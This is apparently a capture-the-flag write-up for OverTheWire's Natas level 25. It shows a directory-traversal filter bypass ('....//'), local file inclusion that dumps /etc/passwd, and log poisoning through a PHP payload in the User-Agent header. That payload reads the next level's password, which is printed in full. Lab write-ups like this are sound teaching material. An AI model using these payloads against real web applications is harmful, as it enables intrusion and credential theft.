# Natas-25

This application is [http://natas25.natas.labs.overthewire.org/?lang=en](http://natas25.natas.labs.overthewire.org/?lang=en) showing a quote in the language passed as the ?lang parameter in the get request . Looking at the source code

## Source:

```php
function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
```

The safeinclude() function takes path and checks if it contains ../ and if it does it logs it using logRequest() funtion . Also it uses str_replace() to replace “../” to “” on the $filename . This can be bypassed by sending ....// . The function will replace ../ in ....// to “” so the end result will be ../ .

Trying to read some local files like /etc/passwd .

```php
PAYLOAD : ?lang=....//....//....//....//....//etc/passwd

RESPONSE : 

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false Debian-exim:x:104:109::/var/spool/exim4:/bin/false messagebus:x:105:110::/var/run/dbus:/bin/false statd:x:106:65534::/var/lib/nfs:/bin/false sshd:x:107:65534::/var/run/sshd:/usr/sbin/nologin morla:x:1000:1000:morla,,,:/home/morla:/bin/bash ntp:x:108:113::/home/ntp:/bin/false mysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false natas31:x:30031:30031:natas level 31:/home/natas31:/bin/bash natas32:x:30032:30032:natas level 32:/home/natas32:/bin/bash natas0:x:30000:30000:natas level 0:/home/natas0:/bin/bash natas1:x:30001:30001:natas level 1:/home/natas1:/bin/bash natas2:x:30002:30002:natas level 2:/home/natas2:/bin/bash natas3:x:30003:30003:natas level 3:/home/natas3:/bin/bash natas4:x:30004:30004:natas level 4:/home/natas4:/bin/bash natas5:x:30005:30005:natas level 5:/home/natas5:/bin/bash natas6:x:30006:30006:natas level 6:/home/natas6:/bin/bash natas7:x:30007:30007:natas level 7:/home/natas7:/bin/bash natas8:x:30008:30008:natas level 8:/home/natas8:/bin/bash natas9:x:30009:30009:natas level 9:/home/natas9:/bin/bash natas10:x:30010:30010:natas level 10:/home/natas10:/bin/bash natas11:x:30011:30011:natas level 11:/home/natas11:/bin/bash natas14:x:30014:30014:natas level 14:/home/natas14:/bin/bash natas15:x:30015:30015:natas level 15:/home/natas15:/bin/bash natas16:x:30016:30016:natas level 16:/home/natas16:/bin/bash natas17:x:30017:30017:natas level 17:/home/natas17:/bin/bash natas20:x:30020:30020:natas level 20:/home/natas20:/bin/bash natas21:x:30021:30021:natas level 21:/home/natas21:/bin/bash natas22:x:30022:30022:natas level 22:/home/natas22:/bin/bash natas23:x:30023:30023:natas level 23:/home/natas23:/bin/bash natas25:x:30025:30025:natas level 25:/home/natas25:/bin/bash natas26:x:30026:30026:natas level 26:/home/natas26:/bin/bash natas29:x:30029:30029:natas level 29:/home/natas29:/bin/bash natas13:x:30013:30013:natas level 13:/home/natas13:/bin/bash natas24:x:30024:30024:natas level 24:/home/natas24:/bin/bash natas27:x:30027:30027:natas level 27:/home/natas27:/bin/bash natas18:x:30018:30018:natas level 18:/home/natas18:/bin/bash natas19:x:30019:30019:natas level 19:/home/natas19:/bin/bash natas34:x:30034:30034:natas level 34:/home/natas34:/bin/bash natas33:x:30033:30033:natas level 33:/home/natas33:/bin/bash natas30:x:30030:30030:natas level 30:/home/natas30:/bin/bash natas12:x:30012:30012:natas level 12:/home/natas12:/bin/bash natas28:x:30028:30028:natas level 28:/home/natas28:/bin/bash
Notice: Undefined variable: __GREETING in /var/www/natas/natas25/index.php on line 80

Notice: Undefined variable: __MSG in /var/www/natas/natas25/index.php on line 81

Notice: Undefined variable: __FOOTER in /var/www/natas/natas25/index.php on line 82
```

We got LFI on the application . Unfortunately we cant read /etc/natas_webpass/natas26 because of this part of 

safeInclude() function . It checks if our input contains the string natas_webpass ,if it does it exits.

```php
if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
```

But we can read the log file using our previously discoverd  LFI . Looking at the LogRequest() function .

  

```php
function logRequest($message){
$log="[". date("d.m.Y H::i:s",time()) ."]";
$log=$log . " " . $*SERVER['HTTP_USER_AGENT'];
$log=$log . " \"" . $message ."\"\n";
$fd=fopen("/var/www/natas/natas25/logs/natas25*" . session_id() .".log","a");
fwrite($fd,$log);
fclose($fd);
}
```

Its logging the useragent that means we can inject into the userAgent field php code and use the LFI to execute it and get the result parsed in our browser . We can use the file_get_contents() to read the /etc/natas_webpass/natas26 to get the password . 

```php
GET /?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_oqtf85obv7iusikl0bmo2rgda4.log HTTP/1.1
Host: natas25.natas.labs.overthewire.org
User-Agent: <?php echo file_get_contents('/etc/natas_webpass/natas26');?>
```

On sending this request . We get the response .

```php
[17.03.2022 01::13:34] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T "Directory traversal attempt! fixing request."
```

```php
Username : Natas26
Password : oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
```